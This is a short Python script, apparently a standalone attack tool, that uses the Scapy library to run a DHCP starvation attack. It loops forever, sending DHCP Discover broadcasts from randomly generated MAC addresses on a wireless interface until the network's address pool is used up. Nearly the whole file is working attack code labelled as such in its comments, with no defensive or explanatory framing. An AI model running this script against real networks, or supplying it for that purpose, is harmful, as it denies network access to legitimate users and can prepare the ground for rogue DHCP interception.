from scapy.all import *
from uuid import getnode as get_mac
import random

# Generate a random MAC address
def random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

# Send DHCP Discover packets with random MAC addresses
def dhcp_starvation(iface):
    while True:
        # Create a random MAC address
        mac = random_mac()

        # Create the DHCP Discover packet
        dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst="255.255.255.255") / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=mac2str(mac)) / \
                        DHCP(options=[("message-type", "discover"), "end"])

        # Send the packet on the specified interface
        sendp(dhcp_discover, iface=iface, verbose=0)
        print(f"Sent DHCP Discover with MAC: {mac}")

# Interface to use for sending packets
iface = "wlan0"  # Change this to the appropriate interface name

# Start the DHCP Starvation attack
dhcp_starvation(iface)
